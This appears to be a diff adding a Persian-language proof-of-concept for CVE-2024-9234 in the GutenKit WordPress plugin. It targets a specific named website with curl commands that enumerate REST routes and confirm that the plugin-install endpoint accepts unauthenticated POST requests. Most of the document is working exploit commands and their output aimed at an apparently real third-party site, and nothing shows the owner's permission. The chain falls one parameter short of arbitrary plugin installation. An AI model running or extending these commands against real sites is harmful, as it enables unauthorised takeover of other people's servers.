@@ -1,0 +1,124 @@
+kawan javanmardi PoC
+
+
+## PoC – CVE-2024-9234
+
+### 1. شناسایی نسخه آسیب‌پذیر
+
+```text id="gxw7cu"
+Target:
+https://zara.varzeshteam.website/
+
+Vulnerable Plugin:
+gutenkit-blocks-addon
+
+Detected Version:
+2.1.0
+```
+
+### 2. کشف مسیر REST API جایگزین
+
+مسیر مستقیم:
+
+```text id="8ck8cb"
+/wp-json/
+```
+
+404 می‌دهد، بنابراین از:
+
+```text id="u0p5qz"
+?rest_route=/
+```
+
+استفاده شد.
+
+```bash id="wmy2l7"
+curl -sk "https://zara.varzeshteam.website/?rest_route=/" \
+| jq -r '.routes | keys[]' \
+| grep -i gutenkit
+```
+
+خروجی:
+
+```text id="kt4m6z"
+/gutenkit/v1
+/gutenkit/v1/active-plugin
+/gutenkit/v1/blocks
+/gutenkit/v1/favorite-templates
+/gutenkit/v1/install-active-plugin
+/gutenkit/v1/media-upload-from-url
+/gutenkit/v1/modules
+/gutenkit/v1/onboard
+/gutenkit/v1/settings
+```
+
+### 3. بررسی متدهای مجاز
+
+```bash id="zdmhcm"
+curl -sk -i -X OPTIONS \
+"https://zara.varzeshteam.website/?rest_route=/gutenkit/v1/install-active-plugin"
+```
+
+خروجی مهم:
+
+```text id="hlayvk"
+allow: POST, PUT, PATCH
+```
+
+بنابراین endpoint وجود دارد و درخواست `POST` می‌پذیرد.
+
+### 4. تأیید دسترسی بدون Authentication
+
+```bash id="abv7kg"
+curl -sk -i -X POST \
+"https://zara.varzeshteam.website/?rest_route=/gutenkit/v1/install-active-plugin" \
+-H "Content-Type: application/json" \
+-d '{}'
+```
+
+پاسخ:
+
+```json id="y3pfp3"
+{
+  "success": false,
+  "data": "Failed to download plugin. Error: No URL Provided."
+}
+```
+
+این نشان می‌دهد درخواست ناشناس به handler مربوط به دانلود Plugin رسیده و فقط به دلیل نبود URL ناموفق شده است.
+
+---
+
+## نتیجه PoC
+
+زنجیره تأییدشده تا این مرحله:
+
+```text id="vt2c01"
+Unauthenticated User
+        |
+        v
+POST request
+        |
+        v
+GutenKit REST API
+        |
+        v
+/install-active-plugin
+        |
+        v
+Request accepted
+        |
+        v
+Plugin download URL required
+```
+
+**نتیجه:** endpoint نصب/فعال‌سازی افزونه بدون ارائه Authentication قابل دسترسی است و پاسخ برنامه نشان می‌دهد که درخواست تا منطق دانلود افزونه پردازش می‌شود. این PoC یک تأیید غیرمخرب از exposure مسیر آسیب‌پذیر است.
+
+## Command جمع‌بندی
+
+```bash id="dsy65r"
+curl -sk -i -X POST \
+  "https://zara.varzeshteam.website/?rest_route=/gutenkit/v1/install-active-plugin" \
+  -H "Content-Type: application/json" \
+  -d '{}'
+```
